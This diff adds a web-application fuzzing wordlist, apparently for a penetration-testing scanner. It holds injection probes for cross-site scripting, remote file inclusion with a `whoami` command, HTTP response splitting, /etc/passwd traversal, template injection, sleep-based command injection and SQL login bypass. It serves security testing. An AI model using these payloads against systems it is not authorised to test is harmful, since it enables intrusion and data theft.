@@ -1,0 +1,37 @@
+Company
+First Last
+username
+username@mailinator.com
+Password123$
++1416312384
+google.com
+https://google.com
+//google.com
+.google.com
+https://google.com/.injectx/rfi_vuln.txt
+https://google.com/.injectx/rfi_vuln.txt?`whoami`
+https://google.com/.injectx/rfi_vuln.txt%00.png
+https://google.com/.injectx/rfi_vuln.txt%00.html
+12188
+01/01/1979
+4242424242424242
+INJECTX
+'>"></INJECTX>(1)
+javascript:alert(1)//
+"><img/onload=alert(1)>' -- 
+"></textarea><img/onload=alert(1)>' -- 
+INJECTX'>"><img/src="https://google.com/.injectx/xss_vuln.png"></img>
+'>"><iframe/onload=alert(1)></iframe>
+INJECTX'>"><ScRiPt>confirm(1)<ScRiPt>
+"></textarea><img/onload=alert(1)>' -- // INJECTX <!-- 
+"><img/onload=alert(1)>' -- // INJECTX <!-- 
+INJECTX'"><h1>X<!-- 
+INJECTX"><h1>X
+en%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2020%0A%3Chtml%3EINJECTX%3C%2Fhtml%3E%0A%0A
+%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2020%0A%3Chtml%3EINJECTX%3C%2Fhtml%3E%0A%0A
+../../../../../../../../../../../etc/passwd%00
+{{4+4}}
+sleep 5; sleep 5 || sleep 5 | sleep 5 & sleep 5 && sleep 5
+admin" or "1"="1"-- 
+admin' or '1'='1'-- 
+INJECTX%0a%0d%00
